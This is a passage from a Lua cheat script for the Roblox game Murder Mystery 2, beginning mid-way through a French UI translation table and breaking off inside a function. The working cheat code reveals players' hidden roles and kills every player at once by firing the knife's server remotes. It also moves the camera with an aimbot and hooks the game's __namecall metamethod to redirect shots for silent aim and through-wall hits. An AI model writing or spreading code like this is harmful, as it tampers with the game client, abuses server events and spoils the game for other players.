	["The selected Auto Kill bot starts once this many coins have been collected."]="Le bot Auto Kill sélectionné démarre après avoir collecté ce nombre de pièces.",
	["Shows the custom text widgets you add to your screen."]="Affiche les widgets texte personnalisés ajoutés à l'écran.",["Enable this, then drag any custom HUD widget with your mouse or finger."]="Active ceci, puis fais glisser les widgets HUD avec la souris ou le doigt.",
	["Adds a draggable text widget to your Roblox screen."]="Ajoute un widget texte déplaçable à l'écran.",["Removes all custom HUD text widgets."]="Supprime tous les widgets texte du HUD.",
	["Name, distance and round coins above each player."]="Nom, distance et pièces de la manche au-dessus de chaque joueur.",["2D rectangle around each player that tracks their pose."]="Rectangle 2D autour de chaque joueur.",
	["Coloured through-wall outline on each player."]="Contour coloré visible à travers les murs sur chaque joueur.",["Fills the chams body instead of outlining it. Needs Chams on."]="Remplit le corps Chams au lieu de le contourer. Nécessite Chams.",
	["Highlights every uncollected coin on the map."]="Met en évidence chaque pièce non collectée sur la carte.",["Notifies you of every elimination, in any role including innocent."]="T'avertit à chaque élimination, quel que soit ton rôle.",
	["Target used by both buttons below"]="Cible utilisée par les deux boutons ci-dessous",["Drops you just above the selected player"]="Te place juste au-dessus du joueur sélectionné",["Pick a player first"]="Choisis d'abord un joueur",
	["Target used by the buttons and Auto Fling below"]="Cible utilisée par les boutons et l'auto-éjection ci-dessous",
	["Fast smart search for your player range."]="Recherche rapide et intelligente selon ta plage de joueurs.",["Teleports directly to the highlighted matching server."]="Te téléporte directement dans le serveur sélectionné.",
	["Finds the best matching server, then joins it."]="Trouve le meilleur serveur correspondant puis le rejoint.",["Rejoins this same server"]="Rejoint ce même serveur",["Joins the fullest server you can"]="Rejoint le serveur disponible le plus rempli",
	["Removes the menu and undoes every change it made"]="Ferme le menu et annule les changements effectués",["Switches the whole colour scheme"]="Change toutes les couleurs du menu",["The highlight colour used across the menu"]="Couleur d'accent utilisée dans le menu",
	["Changes the menu shape instantly and saves your choice."]="Change instantanément la forme du menu et sauvegarde ton choix.",["Changes the visible menu labels immediately and saves your preference."]="Change immédiatement la langue visible du menu et sauvegarde ton choix.",
	["Murderer only. Knifes everyone in reach at once. The sheriff gun version was removed because it would not hit moving targets reliably."]="Meurtrier uniquement. Attaque tous les joueurs à portée. La version pistolet du shérif a été retirée car elle ne touche pas fiablement les cibles mobiles.",
	["Redirects your knife throws to the closest player in your FOV. Murderer only. The gun version was removed because it would not hit moving targets reliably."]="Redirige les lancers de couteau vers le joueur le plus proche dans ton champ de vision. Meurtrier uniquement.",
	["Your shots ignore geometry. Aim at a player or anywhere on the map. Does not shoot for you."]="Tes tirs traversent la géométrie. Vise un joueur ou un endroit sur la carte : cela ne tire pas automatiquement.",
	["Well above the default is an easy way to get kicked."]="Une valeur très supérieure à celle de base peut facilement te faire expulser.",
	["Removes the Fly keybind. You can also click the small key box next to Fly and press Escape."]="Supprime la touche de vol. Tu peux aussi cliquer sur la petite case à côté de Vol et appuyer sur Échap.",
	["Removes the Noclip keybind. You can also click the small key box next to Noclip and press Escape."]="Supprime la touche Noclip. Tu peux aussi cliquer sur la petite case à côté de Noclip et appuyer sur Échap.",
	["Text used for the next HUD widget."]="Texte utilisé pour le prochain widget HUD.",["Displays your current role: Innocent, Murderer, Sheriff or Hero."]="Affiche ton rôle actuel : innocent, meurtrier, shérif ou héros.",
	["Displays your current round coin count."]="Affiche ton nombre de pièces de la manche.",["Displays whether your coin bag is still collecting or full."]="Affiche si ton sac de pièces collecte encore ou est plein.",
	["Displays the coin currently targeted by the coin bot."]="Affiche la pièce actuellement ciblée par le bot.",["Displays the current local time."]="Affiche l'heure locale actuelle.",
	["Displays the number of players in the server."]="Affiche le nombre de joueurs dans le serveur.",["Displays the current network ping."]="Affiche le ping réseau actuel.",["Displays Nokia server ping plus connected users in this server and worldwide."]="Affiche le ping Nokia et les utilisateurs connectés dans ce serveur et dans le monde.",
	["Displays whether one of the Auto Kill bots is enabled."]="Affiche si l'un des bots Auto Kill est activé.",["Displays your current health."]="Affiche ta santé actuelle.",
	["Displays your current map coordinates."]="Affiche tes coordonnées sur la carte.",["Displays the weapon currently equipped."]="Affiche l'arme actuellement équipée.",
	["Displays whether you are alive or dead."]="Affiche si tu es vivant ou mort.",["Displays the current camera FOV."]="Affiche le champ de vision actuel de la caméra.",
	["Colours every ESP by role and shows [M] [S] [I] tags."]="Colore chaque ESP selon le rôle et affiche les étiquettes [M] [S] [I].",["Draws bone lines over each player."]="Dessine les lignes du squelette sur chaque joueur.",
	["UNTESTED. Murderer traps are invisible by design. This shows them through walls."]="NON TESTÉ. Les pièges du meurtrier sont invisibles par défaut. Ceci les affiche à travers les murs.",
	["Removes darkness so nowhere on the map is unlit."]="Retire l'obscurité afin que toute la carte soit éclairée.",["Strips particles, shadows, decals and post effects. Reversed on unload."]="Retire particules, ombres, décalcomanies et effets visuels. Annulé à la fermeture.",
	["Launches the selected player using physics. You return to where you were."]="Éjecte le joueur sélectionné avec la physique. Tu reviens à ta position.",["Flings everyone in the server one after another, then puts you back"]="Éjecte tous les joueurs du serveur puis te ramène.",
	["Flings the murderer on sight, over and over, for as long as this is on."]="Éjecte le meurtrier dès qu'il est détecté, tant que l'option est active.",["Flings whoever is holding the gun, sheriff or hero, on sight."]="Éjecte le porteur du pistolet, shérif ou héros, dès qu'il est détecté.",
	["Anyone in the server, including yourself"]="N'importe qui dans le serveur, y compris toi.",["Reads Roblox account info and their full MM2 profile"]="Lit les informations du compte Roblox et le profil MM2 complet.",
	["Opens MM2's own profile window for them, with every weapon, pet, effect and emote"]="Ouvre leur fenêtre de profil MM2 avec armes, animaux, effets et emotes.",["Copies the last lookup to your clipboard"]="Copie la dernière recherche dans le presse-papiers.",
	["Blocks other exploiters from flinging you. Stands down while the game teleports you between rounds."]="Empêche les autres exploiteurs de t'éjecter. Se désactive pendant les téléportations entre les manches.",
	["UNTESTED. Cancels the slow when you walk into a murderer trap, so you keep full speed."]="NON TESTÉ. Annule le ralentissement lorsque tu marches dans un piège du meurtrier.",["Stops the 20 minute idle kick."]="Empêche l'expulsion après 20 minutes d'inactivité.",
	["A notification that sticks around updating their distance while the murderer is within 50 studs."]="Une notification qui reste affichée et met à jour la distance du meurtrier à moins de 50 studs.",
	["Copies this server's job id to your clipboard"]="Copie l'identifiant de ce serveur dans le presse-papiers.",["Example: set 2 here and 3 below to find servers with 2 or 3 players."]="Exemple : mets 2 ici et 3 ci-dessous pour trouver des serveurs avec 2 ou 3 joueurs.",
	["The search automatically looks from the emptiest or fullest side, depending on this range."]="La recherche regarde automatiquement depuis les serveurs les plus vides ou les plus remplis selon cette plage.",["Never show a server you cannot join."]="N'affiche jamais un serveur que tu ne peux pas rejoindre.",
	["Pick a server, then use Join Selected."]="Choisis un serveur, puis utilise Rejoindre la sélection.",["On-screen buttons for fly up, fly down and aimbot hold. Auto-enabled on touch devices, since those have no Space, Ctrl or right click."]="Boutons à l'écran pour monter, descendre et maintenir l'aimbot. Activés automatiquement sur tactile.",
	["Shows a small draggable square while the menu is hidden. Click it to reopen."]="Affiche un petit carré déplaçable quand le menu est caché. Clique dessus pour le rouvrir.",["Draggable on-screen reminder of your menu keybind."]="Rappel déplaçable à l'écran de la touche du menu.",
	["Name to save the current settings under"]="Nom sous lequel sauvegarder les réglages actuels.",["Your saved setting profiles"]="Tes profils de réglages sauvegardés.",
	["Writes every toggle and slider to this config"]="Enregistre toutes les options et curseurs dans cette configuration.",["Applies the selected config"]="Applique la configuration sélectionnée.",
	["Applies this config automatically on every launch"]="Applique automatiquement cette configuration à chaque lancement.",["Removes the selected config"]="Supprime la configuration sélectionnée.",
}
NOKia.applyUiLanguage=function(language)
	NOKia.uiLanguage=language
	local screen=Library.ScreenGui
	if not screen then return end
	for _,node in ipairs(screen:GetDescendants()) do
		if node:IsA("TextLabel") or node:IsA("TextButton") then
			local original=node:GetAttribute("NokiaEnglishText")
			if original==nil then original=node.Text; node:SetAttribute("NokiaEnglishText",original) end
			if language=="French" then
				-- Leave library placeholders and dynamic text alone; only replace known UI strings.
				if NOKia.frenchText[original] then node.Text=NOKia.frenchText[original] end
			else
				node.Text=original
			end
		end
	end
	pcall(function() if NOKia.updateOnlineLanguage then NOKia.updateOnlineLanguage() end end)
end
NOKia.showActionToast=function(message)
	local frame=create("Frame",{Name=rnd(),Size=UDim2.fromOffset(330,0),AutomaticSize=Enum.AutomaticSize.None,BackgroundColor3=Color3.fromRGB(19,28,46),BackgroundTransparency=1,ClipsDescendants=true,Parent=NOKia.toastHolder},
		{create("UICorner",{CornerRadius=UDim.new(0,13)}),create("UIStroke",{Color=Color3.fromRGB(105,154,255),Transparency=.3,Thickness=1.2})})
	local text=create("TextLabel",{BackgroundTransparency=1,Position=UDim2.fromOffset(14,0),Size=UDim2.new(1,-28,1,0),Font=Enum.Font.GothamMedium,TextSize=14,TextXAlignment=Enum.TextXAlignment.Left,TextColor3=Color3.fromRGB(244,247,255),TextTransparency=1,Text="NOKia  •  "..tostring(message),Parent=frame})
	TweenService:Create(frame,TweenInfo.new(.16,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Size=UDim2.fromOffset(330,42),BackgroundTransparency=.06}):Play()
	TweenService:Create(text,TweenInfo.new(.16),{TextTransparency=0}):Play()
	task.delay(2,function()
		if not frame.Parent then return end
		TweenService:Create(text,TweenInfo.new(.16),{TextTransparency=1}):Play()
		local out=TweenService:Create(frame,TweenInfo.new(.18,Enum.EasingStyle.Quad,Enum.EasingDirection.In),{Size=UDim2.fromOffset(330,0),BackgroundTransparency=1})
		out:Play(); out.Completed:Wait(); pcall(function() frame:Destroy() end)
	end)
end
local HUD_LAYOUT_FILE=CONFIG_FOLDER.."/hud_layout.json"
local hudWidgets={}
local function saveHudLayout()
	local layout={}
	for _,widget in ipairs(hudWidgets) do
		if widget.frame and widget.frame.Parent then
			local p=widget.frame.Position
			layout[#layout+1]={text=widget.label.Text,kind=widget.kind,xs=p.X.Scale,xo=p.X.Offset,ys=p.Y.Scale,yo=p.Y.Offset}
		end
	end
	pcall(function()
		if typeof(isfolder)=="function" and not isfolder(CONFIG_FOLDER) then makefolder(CONFIG_FOLDER) end
		writefile(HUD_LAYOUT_FILE,HttpService:JSONEncode(layout))
	end)
end
local function addHudWidget(data)
	data=data or {}
	local width=data.width or (data.kind=="nokiaonline" and 370 or 190)
	local frame=create("Frame",{Name=rnd(),Active=true,AnchorPoint=Vector2.new(0.5,0.5),Position=UDim2.new(data.xs or .5,data.xo or 0,data.ys or .2,data.yo or 0),Size=UDim2.fromOffset(width,38),BackgroundColor3=Color3.fromRGB(18,28,48),BackgroundTransparency=.12,Parent=HudGui},
		{create("UICorner",{CornerRadius=UDim.new(0,12)}),create("UIStroke",{Color=Color3.fromRGB(120,160,255),Transparency=.35})})
	local label=create("TextLabel",{BackgroundTransparency=1,Size=UDim2.fromScale(1,1),Text=data.text or "NOKia HUD",Font=Enum.Font.GothamBold,TextSize=15,TextColor3=Color3.fromRGB(245,248,255),TextXAlignment=Enum.TextXAlignment.Center,Parent=frame})
	local widget={frame=frame,label=label,kind=data.kind}; table.insert(hudWidgets,widget)
	local dragging,startMouse,startPosition=false,nil,nil
	bind(frame.InputBegan,function(input)
		if not flags.guiEditMode then return end
		if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
			dragging=true; startMouse=input.Position; startPosition=frame.Position
		end
	end)
	bind(UserInputService.InputChanged,function(input)
		if not dragging or not (input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch) then return end
		local delta=input.Position-startMouse
		frame.Position=UDim2.new(startPosition.X.Scale,startPosition.X.Offset+delta.X,startPosition.Y.Scale,startPosition.Y.Offset+delta.Y)
	end)
	bind(UserInputService.InputEnded,function(input)
		if dragging and (input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch) then dragging=false; saveHudLayout() end
	end)
	return widget
end
local function clearHudWidgets()
	for _,widget in ipairs(hudWidgets) do pcall(function() widget.frame:Destroy() end) end
	table.clear(hudWidgets); saveHudLayout()
end
local function loadHudLayout()
	local ok,raw=pcall(function()
		if typeof(isfile)=="function" and isfile(HUD_LAYOUT_FILE) then return readfile(HUD_LAYOUT_FILE) end
	end)
	if ok and type(raw)=="string" then
		local success,layout=pcall(function() return HttpService:JSONDecode(raw) end)
		if success and type(layout)=="table" then
			for _,data in ipairs(layout) do if type(data)=="table" then addHudWidget(data) end end
		end
	end
end
loadHudLayout()
do
	local lineMT={}
	local function apply(t)
		local f=rawget(t,"_f")
		if not (f and f.Parent) then return end
		local a,b=rawget(t,"_From"),rawget(t,"_To")
		if not (a and b) then return end
		local d=b-a
		f.Position=UDim2.fromOffset((a.X+b.X)*0.5,(a.Y+b.Y)*0.5)
		f.Size=UDim2.fromOffset(math.max(d.Magnitude,1),math.max(rawget(t,"_Thickness") or 1,1))
		f.Rotation=math.deg(math.atan2(d.Y,d.X))
	end
	local function remove(t)
		local f=rawget(t,"_f")
		if f then pcall(function() f:Destroy() end) end
	end
	lineMT.__index=function(t,k)
		if k=="Remove" then return remove end
		return rawget(t,"_"..k)
	end
	lineMT.__newindex=function(t,k,v)
		rawset(t,"_"..k,v)
		local f=rawget(t,"_f")
		if not (f and f.Parent) then return end
		if k=="Visible" then f.Visible=(v==true)
		elseif k=="Color" then f.BackgroundColor3=v
		elseif k=="Transparency" then f.BackgroundTransparency=1-(tonumber(v) or 1)
		elseif k=="From" or k=="To" or k=="Thickness" then apply(t) end
	end
	NOKia.hasDrawing=(typeof(Drawing)=="table") and (pcall(function()
		local probe=Drawing.new("Line"); probe:Remove()
	end))
	function NOKia.newLine(thickness)
		if NOKia.hasDrawing then
			local l=Drawing.new("Line"); l.Thickness=thickness; l.Transparency=1; l.Visible=false
			return l
		end
		local t=setmetatable({},lineMT)
		rawset(t,"_f",create("Frame",{Name=rnd(),AnchorPoint=Vector2.new(0.5,0.5),BorderSizePixel=0,
			BackgroundColor3=Color3.new(1,1,1),Visible=false,ZIndex=3,Parent=EspGui}))
		rawset(t,"_Thickness",thickness)
		rawset(t,"_Visible",false)
		return t
	end
end

local CRC; pcall(function() CRC=require(RS:WaitForChild("Modules"):WaitForChild("CurrentRoundClient")) end)
local function roundData(plr) return CRC and CRC.PlayerData and CRC.PlayerData[plr.Name] end
local function getHRP(ch) return ch and ch:FindFirstChild("HumanoidRootPart") end
local function charHasWeapon(ch,kind)
	for _,t in ipairs(ch:GetChildren()) do
		if t:IsA("Tool") then
			if kind=="Gun" and (t.Name=="Gun" or t:FindFirstChild("Shoot")) then return true end
			if kind=="Knife" and (t.Name=="Knife" or t:FindFirstChild("Events")) then return true end
		end
	end
	return false
end
local CollectionService=game:GetService("CollectionService")
function NOKia.refreshTags()
	for _,tag in ipairs({"Weapon_Gun","Weapon_Knife"}) do
		local m=NOKia.tagOwners[tag]
		if m then table.clear(m) else m={}; NOKia.tagOwners[tag]=m end
		for _,t in ipairs(CollectionService:GetTagged(tag)) do
			local par=t.Parent
			if par then m[par]=true end
		end
	end
end
NOKia.refreshTags()
local function playerHasTagged(plr,tag)
	local m=NOKia.tagOwners[tag]; if not m then return false end
	local ch=plr.Character
	if ch and m[ch] then return true end
	local bp=plr:FindFirstChildOfClass("Backpack")
	if bp and m[bp] then return true end
	return false
end
local function computeRole(plr)
	local d=roundData(plr)
	local r=d and d.Role
	if r=="Murderer" then return "Murderer" end
	if r=="Sheriff" or r=="Hero" then return r end
	local ch=plr.Character
	if playerHasTagged(plr,"Weapon_Gun") or (ch and charHasWeapon(ch,"Gun")) then return "Hero" end
	if playerHasTagged(plr,"Weapon_Knife") or (ch and charHasWeapon(ch,"Knife")) then return "Murderer" end
	return r or "Innocent"
end
local function computeAlive(plr)
	local d=roundData(plr); if d and d.Dead==true then return false end
	local ch=plr.Character; local hum=ch and ch:FindFirstChildOfClass("Humanoid")
	return ch and hum and hum.Health>0 and getHRP(ch)
end
local CACHE_TTL=0.05
local roleCache,aliveCache,cacheStamp={},{},0
local function sweepCaches()
	local now=os.clock()
	if now-cacheStamp>CACHE_TTL then
		table.clear(roleCache); table.clear(aliveCache); cacheStamp=now
		NOKia.refreshTags()
	end
end
local function roleOf(plr)
	sweepCaches()
	local v=roleCache[plr]
	if v==nil then v=computeRole(plr); roleCache[plr]=v end
	return v
end
local function alive(plr)
	sweepCaches()
	local v=aliveCache[plr]
	if v==nil then v=computeAlive(plr) or false; aliveCache[plr]=v end
	return v
end
local function myRole() return roleOf(LocalPlayer) end
local function isGunRole(role) return role=="Sheriff" or role=="Hero" end
local function roleBotCanRun()
	if flags.coinLimitBeforeRoleBot then
		local d=roundData(LocalPlayer)
		local roundCoins=d and tonumber(d.Coins) or 0
		return math.max(collectedCoinCount,roundCoins or 0)>=roleBotCoinLimit
	end
	return not flags.coinBagBeforeRoleBot or coinBagFull
end
local function roleBotNeedsCoins()
	if not (flags.murdererSheriffBot or flags.sheriffMurdererBot) then return false end
	if flags.coinLimitBeforeRoleBot then return not roleBotCanRun() end
	return flags.coinBagBeforeRoleBot and not coinBagFull
end
task.spawn(function()
	while not Library.Unloaded do
		for _,widget in ipairs(hudWidgets) do
			if widget.frame and widget.frame.Parent and widget.kind then
				if widget.kind=="role" then
					widget.label.Text="ROLE  ·  "..tostring(myRole())
				elseif widget.kind=="coins" then
					local d=roundData(LocalPlayer); local coins=d and tonumber(d.Coins) or collectedCoinCount
					widget.label.Text="COINS  ·  "..tostring(coins or 0)
				elseif widget.kind=="bag" then
					widget.label.Text=coinBagFull and "COIN BAG  ·  FULL" or "COIN BAG  ·  COLLECTING"
				elseif widget.kind=="target" then
					local target=NOKia.coinTarget
					widget.label.Text=target and target.Parent and "BOT TARGET  ·  COIN" or "BOT TARGET  ·  NONE"
				elseif widget.kind=="clock" then
					widget.label.Text="TIME  ·  "..os.date("%H:%M:%S")
				elseif widget.kind=="players" then
					widget.label.Text="SERVER  ·  "..tostring(#NOKia.plrs).." PLAYERS"
				elseif widget.kind=="ping" then
					local ping="--"
					pcall(function() ping=tostring(math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())) end)
					widget.label.Text="PING  ·  "..ping.." ms"
				elseif widget.kind=="nokiaonline" then
					local stat=NOKia.onlineStats or {}
					widget.label.Text="NOKIA  ·  "..tostring(stat.serverOnline or 0).." SERVEUR  •  "..tostring(stat.globalOnline or 0).." MONDE  •  "..tostring(stat.ping or "--").." ms"
				elseif widget.kind=="autokill" then
					local active=flags.murdererSheriffBot or flags.sheriffMurdererBot
					widget.label.Text=active and "AUTO KILL  ·  ON" or "AUTO KILL  ·  OFF"
				elseif widget.kind=="health" then
					local h=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
					widget.label.Text=h and ("HEALTH  ·  "..math.floor(h.Health).." / "..math.floor(h.MaxHealth)) or "HEALTH  ·  --"
				elseif widget.kind=="position" then
					local h=getHRP(LocalPlayer.Character)
					widget.label.Text=h and string.format("POS  ·  %d  %d  %d",h.Position.X,h.Position.Y,h.Position.Z) or "POS  ·  --"
				elseif widget.kind=="weapon" then
					local ch=LocalPlayer.Character; local tool=ch and ch:FindFirstChildOfClass("Tool")
					widget.label.Text="WEAPON  ·  "..(tool and tool.Name or "None")
				elseif widget.kind=="alive" then
					widget.label.Text=alive(LocalPlayer) and "ROUND STATUS  ·  ALIVE" or "ROUND STATUS  ·  DEAD"
				elseif widget.kind=="fov" then
					widget.label.Text="FOV  ·  "..tostring(math.floor(Camera.FieldOfView))
				end
			end
		end
		task.wait(.2)
	end
end)
local function isEnemyOf(myrole,role)
	if myrole=="Murderer" then return true end
	if isGunRole(myrole) then return role=="Murderer" end
	return false
	end
function NOKia.refreshPlrs()
	local ok,list=pcall(function() return Players:GetPlayers() end)
	if ok and type(list)=="table" then NOKia.plrs=list end
end
NOKia.refreshPlrs()
bind(Players.PlayerAdded,NOKia.refreshPlrs)
bind(Players.PlayerRemoving,function()
	task.defer(NOKia.refreshPlrs)
end)
local function findMurderer() for _,p in ipairs(NOKia.plrs) do if roleOf(p)=="Murderer" then return p end end end
local function findWeapon(n) local ch=LocalPlayer.Character; local bp=LocalPlayer:FindFirstChildOfClass("Backpack"); return (ch and ch:FindFirstChild(n)) or (bp and bp:FindFirstChild(n)) end
local function equip(tool) local ch=LocalPlayer.Character; local hum=ch and ch:FindFirstChildOfClass("Humanoid"); if tool and hum and tool.Parent~=ch then pcall(function() hum:EquipTool(tool) end) end end

local Stats=game:GetService("Stats")
local function netPing()
	local ok,v=pcall(function() return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()/1000 end)
	if ok and type(v)=="number" and v>0 and v<1 then return v end
	return 0.12
end
local PREDICT_MIN_SPEED=1
function NOKia.aimPointFor(p)
	local ch=p and p.Character; local hrp=ch and getHRP(ch); if not hrp then return end
	local part=ch:FindFirstChild("UpperTorso") or ch:FindFirstChild("Torso") or hrp
	return part.Position
end
local KNIFE_PARTS={"HumanoidRootPart","UpperTorso","LowerTorso","Torso","Head"}
local function knifeKill(ev,targetChar)
	if not (ev and targetChar) then return end
	local ht=ev:FindFirstChild("HandleTouched"); local ks=ev:FindFirstChild("KnifeStabbed")
	if not ht then return end
	for _,pn in ipairs(KNIFE_PARTS) do local part=targetChar:FindFirstChild(pn); if part then ht:FireServer(part) end end
	if ks then ks:FireServer() end
end
NOKia.killEveryoneExceptGunRole=function()
	task.spawn(function()
		if myRole()~="Murderer" or not NOKia.canAct() then
			notify("This action is available only while you are the murderer")
			return
		end
		local knife=findWeapon("Knife")
		local events=knife and knife:FindFirstChild("Events")
		if not events then notify("Knife not found") return end
		equip(knife)
		RunService.Heartbeat:Wait()
		knife=findWeapon("Knife")
		events=knife and knife:FindFirstChild("Events")
		if not events then notify("Knife not equipped") return end
		local count=0
		for _,player in ipairs(NOKia.plrs) do
			if player~=LocalPlayer and alive(player) and not isGunRole(roleOf(player)) then
				knifeKill(events,player.Character)
				count+=1
			end
		end
		notify("Attacked "..count.." player"..(count==1 and "" or "s").." (sheriff/hero excluded)")
	end)
end
local function shootGunAt(pos,throughWalls)
	if not pos then return end
	local gun=findWeapon("Gun"); if not gun then return end; equip(gun)
	local shoot=gun:FindFirstChild("Shoot"); if not shoot then return end
	local myhrp=getHRP(LocalPlayer.Character); if not myhrp then return end
	local origin
	if true then
		local dir=(pos-myhrp.Position); dir=dir.Magnitude>0.1 and dir.Unit or myhrp.CFrame.LookVector
		origin=CFrame.new(pos-dir*2,pos)
	else
		local att=myhrp:FindFirstChild("GunRaycastAttachment")
		origin=(att and att.WorldCFrame) or CFrame.new(myhrp.Position,pos)
	end
	shoot:FireServer(origin,CFrame.new(pos))
end
local function aimAt(target,role,throughWalls)
	if role=="Murderer" then
		local knife=findWeapon("Knife"); if not knife then return 0 end; equip(knife)
		knifeKill(knife:FindFirstChild("Events"),target.Character); return 0.1
	elseif isGunRole(role) then
		shootGunAt(NOKia.aimPointFor(target),throughWalls==true); return 0.15
	end
	return 0
end
local losParams=RaycastParams.new()
losParams.FilterType=Enum.RaycastFilterType.Exclude
local function hasLineOfSight(ch)
	local myCh=LocalPlayer.Character
	local myHrp=getHRP(myCh); local tHrp=getHRP(ch)
	if not (myHrp and tHrp) then return false end
	losParams.FilterDescendantsInstances={myCh,ch}
	local dir=tHrp.Position-myHrp.Position
	if dir.Magnitude<0.1 then return true end
	return workspace:Raycast(myHrp.Position,dir,losParams)==nil
end
local function enemies()
	local role=myRole(); local list={}
	if isGunRole(role) then local m=findMurderer(); if m and alive(m) then table.insert(list,m) end
	else for _,p in ipairs(NOKia.plrs) do if p~=LocalPlayer and alive(p) then table.insert(list,p) end end end
	return list,role
end
local function nearest(list)
	local hrp=getHRP(LocalPlayer.Character); if not hrp then return end
	local best,bd
	for _,p in ipairs(list) do
		local h=getHRP(p.Character)
		if h then
			local d=(h.Position-hrp.Position).Magnitude
			if not bd or d<bd then bd,best=d,p end
		end
	end
	return best
end
local function fovTarget()
	local mr=myRole()
	if not (mr=="Murderer" or isGunRole(mr)) then return nil end
	local center=mousePos(); local best,bd
	for _,p in ipairs(NOKia.plrs) do if p~=LocalPlayer and alive(p) and isEnemyOf(mr,roleOf(p)) then
			local hrp=getHRP(p.Character)
			if hrp then local v,on=Camera:WorldToViewportPoint(hrp.Position)
				if on and v.Z>0 then local d=(Vector2.new(v.X,v.Y)-center).Magnitude; if d<=aimFov and (not bd or d<bd) then bd,best=d,p end end
			end
		end end
	return best
end

task.spawn(function() while not Library.Unloaded do
		local okLoop,errLoop=pcall(function()
			if flags.autoKill then
				local list,role=enemies()
				if role=="Murderer" then
					local knife=findWeapon("Knife"); local ev=knife and knife:FindFirstChild("Events")
					if ev then equip(knife)
						for _,tgt in ipairs(list) do
							if not flags.autoKill then break end
							knifeKill(ev,tgt.Character)
						end
					end
					task.wait(0.05)
				else task.wait(0.1) end
			else task.wait(0.08) end
		end)
		if not okLoop then warn("[NOKia] auto kill: "..tostring(errLoop)); task.wait(0.25) end
	end end)
task.spawn(function() local last=0 while not Library.Unloaded do
		task.wait(0.03)
	end end)
local FovCircle=create("Frame",{Name=rnd(),AnchorPoint=Vector2.new(.5,.5),Position=UDim2.fromScale(.5,.5),Size=UDim2.fromOffset(240,240),BackgroundTransparency=1,BorderSizePixel=0,Visible=false,Parent=EspGui},
{create("UICorner",{CornerRadius=UDim.new(1,0)}),create("UIStroke",{Color=Color3.fromRGB(255,255,255),Thickness=1.5,Transparency=0.25})})
bind(RunService.RenderStepped,function()
	if flags.showFov and (flags.aimbot or flags.silentAim) then
		FovCircle.Visible=true; FovCircle.Size=UDim2.fromOffset(aimFov*2,aimFov*2); local mp=mousePos(); FovCircle.Position=UDim2.fromOffset(mp.X,mp.Y)
	else FovCircle.Visible=false end
	if flags.aimbot and (NOKia.mobAim or (Options.AimKey and Options.AimKey:GetState())) then
		local t=fovTarget()
		if t then local th=t.Character:FindFirstChild("Head") or getHRP(t.Character)
			if th then Camera.CFrame=Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position,th.Position),0.45) end end
	end
end)
local silentAimPos
local function crosshairEnemyPos(radius)
	local mr=myRole()
	if not (mr=="Murderer" or isGunRole(mr)) then return nil end
	local center=mousePos()
	local best,bd
	for _,p in ipairs(NOKia.plrs) do
		if p~=LocalPlayer and alive(p) and isEnemyOf(mr,roleOf(p)) then
			local ch=p.Character; local hrp=getHRP(ch)
			if hrp then
				local sp=Camera:WorldToViewportPoint(hrp.Position)
				if sp.Z>0 then
					local d=(Vector2.new(sp.X,sp.Y)-center).Magnitude
					if d<=radius and (not bd or d<bd) then
						bd=d
						best=p
					end
				end
			end
		end
	end
	return best and NOKia.aimPointFor(best) or nil
end
local function crosshairAnyPlayerPos(radius)
	local center=mousePos()
	local best,bd
	for _,p in ipairs(NOKia.plrs) do
		if p~=LocalPlayer and alive(p) then
			local ch=p.Character; local hrp=getHRP(ch)
			if hrp then
				local sp=Camera:WorldToViewportPoint(hrp.Position)
				if sp.Z>0 then
					local d=(Vector2.new(sp.X,sp.Y)-center).Magnitude
					if d<=radius and (not bd or d<bd) then
						bd=d
						best=p
					end
				end
			end
		end
	end
	return best and NOKia.aimPointFor(best) or nil
end
local function computeSilentTarget()
	local mr=myRole()
	if mr~="Murderer" then return nil end
	return crosshairAnyPlayerPos(aimFov)
end
local function aimRay()
	local m=UserInputService:GetMouseLocation()
	local x,y=m.X,m.Y
	local ml=LocalPlayer.PlayerScripts and LocalPlayer.PlayerScripts:FindFirstChild("MouseLock")
	if ml and ml:GetAttribute("Enabled")==true and UserInputService.PreferredInput~=Enum.PreferredInput.Gamepad then
		local vs=Camera.ViewportSize
		x,y=vs.X/2,vs.Y/2
	end
	return Camera:ViewportPointToRay(x,y)
end
local function wallAimPos()
	local ray=aimRay()
	local origin,dir=ray.Origin,ray.Direction.Unit
	local far=origin+dir*300
	local chars={}
	for _,p in ipairs(Players:GetPlayers()) do
		if p~=LocalPlayer and alive(p) and p.Character then chars[#chars+1]=p.Character end
	end
	if #chars==0 then return nil,far end
	local params=RaycastParams.new()
	params.FilterType=Enum.RaycastFilterType.Include
	params.FilterDescendantsInstances=chars
	local hit=workspace:Raycast(origin,dir*300,params)
	return (hit and hit.Position or nil),far
end
local wallSnapPos, wallFarPos, myHrpPos
bind(RunService.Heartbeat,function()
	silentAimPos = flags.silentAim and computeSilentTarget() or nil
	if flags.knifeWalls or flags.gunWalls then
		wallSnapPos, wallFarPos = wallAimPos()
	else
		wallSnapPos, wallFarPos = nil, nil
	end
	local h=getHRP(LocalPlayer.Character); myHrpPos = h and h.Position or nil
end)
NOKia.hookOk=pcall(function()
	if typeof(hookmetamethod)~="function" or typeof(newcclosure)~="function"
		or typeof(checkcaller)~="function" or typeof(getnamecallmethod)~="function" then
		error("executor has no __namecall hooking")
	end
	local oldNamecall
	oldNamecall=hookmetamethod(game,"__namecall",newcclosure(function(self,...)
		if not checkcaller() and getnamecallmethod()=="FireServer" then
			local nm=self.Name
			if nm=="Shoot" or nm=="KnifeThrown" then
				local walls=(nm=="Shoot" and flags.gunWalls) or (nm=="KnifeThrown" and flags.knifeWalls)
				if nm=="KnifeThrown" and flags.instantKnife and os.clock()-instantFiredAt<0.6 then
					return
				end
				local silent=flags.silentAim and silentAimPos
				local wallTarget
				if walls then
					if nm=="Shoot" then wallTarget=wallSnapPos
					else wallTarget=wallSnapPos or wallFarPos end
				end
				local retarget=(silent and silentAimPos) or wallTarget or nil
				if retarget then
					local n=select("#",...)
					if n>=2 then
						local a={...}
						if typeof(a[2])=="CFrame" then
							if retarget then a[2]=CFrame.new(retarget) end
							if walls and retarget and myHrpPos and typeof(a[1])=="CFrame" then
								local tp=a[2].Position
								local d=tp-myHrpPos
